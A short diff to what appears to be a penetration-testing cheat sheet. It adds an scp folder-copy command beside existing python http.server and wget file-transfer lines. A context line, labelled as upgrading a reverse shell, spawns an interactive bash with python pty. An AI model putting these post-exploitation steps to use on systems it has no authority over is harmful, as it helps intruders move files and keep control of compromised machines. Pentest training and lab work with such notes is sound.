@@ -2,6 +2,8 @@
 python -m http.server <port>
 wget -r http://<ip address>:<port>
 
+ # or 
+ scp -r -p user@serveur1:chemin/vers/dossier/source user@serveur2:chemin/vers/dossier/destination
 
 # update reverse shell 
 python -c 'import pty; pty.spawn("/bin/bash")'  
